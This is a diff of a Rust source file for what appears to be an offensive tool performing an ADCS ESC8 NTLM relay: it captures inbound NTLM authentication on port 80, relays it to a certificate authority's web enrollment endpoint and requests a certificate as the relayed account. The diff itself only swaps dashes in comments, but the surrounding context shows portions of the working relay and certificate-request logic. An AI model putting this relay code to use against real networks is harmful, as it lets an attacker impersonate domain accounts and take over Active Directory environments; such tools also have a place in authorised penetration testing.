@@ -1,10 +1,10 @@
-//! ADCS ESC8 Relay — asynchronous NTLM relay to Active Directory Certificate Services.
+//! ADCS ESC8 Relay -- asynchronous NTLM relay to Active Directory Certificate Services.
 //!
 //! Listens for inbound HTTP connections on port 80, performs a 3-message NTLM relay
 //! to the target ADCS certsrv endpoint, and then POSTs a CSR on the authenticated
 //! connection to obtain a certificate on behalf of the relayed account.
 //!
-//! All I/O is `tokio`-native — no blocking threads or `std::io` in the hot path.
+//! All I/O is `tokio`-native -- no blocking threads or `std::io` in the hot path.
 
 use crate::{RelayError, Result};
 use base64::Engine;
@@ -17,7 +17,7 @@ use tracing::{debug, error, info, warn};
 // Per-operation I/O timeout
 const IO_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(15);
 
-// Read buffer size — large enough for a full HTTP response with NTLM blob
+// Read buffer size -- large enough for a full HTTP response with NTLM blob
 const BUF: usize = 16_384;
 
 // -------------------------------------------------------------
@@ -145,7 +145,7 @@ async fn handle_client(
     let negotiate_header: String = if let Some(hdr) = auth_header {
         hdr.to_owned()
     } else {
-        // Step 1 — return 401 to trigger NTLM negotiate
+        // Step 1 -- return 401 to trigger NTLM negotiate
         let challenge_resp = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n";
         timed_write(&mut client, challenge_resp.as_bytes()).await?;
 
@@ -231,7 +231,7 @@ async fn process_ntlm_relay(
     let resp2 = String::from_utf8_lossy(&buf[..n3]);
 
     // Only treat 200 OK and 302 redirect as successful authentication.
-    // A 404 response means the ADCS endpoint was not found — not a success.
+    // A 404 response means the ADCS endpoint was not found -- not a success.
     if !resp2.contains("200 OK") && !resp2.contains("302") {
         return Err(
             RelayError::Authentication("ADCS rejected NTLM Authenticate message".into()).into(),
@@ -272,7 +272,7 @@ async fn process_ntlm_relay(
     } else if final_resp.contains("disposed of") || final_resp.contains("denied") {
         warn!("ESC8: Certificate request was denied by the CA");
     } else {
-        warn!("ESC8: Certificate status unknown — inspect CA logs");
+        warn!("ESC8: Certificate status unknown -- inspect CA logs");
     }
 
     Ok(())
@@ -326,7 +326,7 @@ fn build_minimal_csr_der() -> Vec<u8> {
         0x55, 0x04, 0x03, 0x0C, 0x00, 0x30, 0x82, 0x02, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86,
         0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x02, 0x0F, 0x00, 0x30,
         0x82, 0x02, 0x0A, 0x02, 0x82, 0x02, 0x01, 0x00,
-        // RSA public key modulus (257 bytes zeroed — real code would fill this)
+        // RSA public key modulus (257 bytes zeroed -- real code would fill this)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
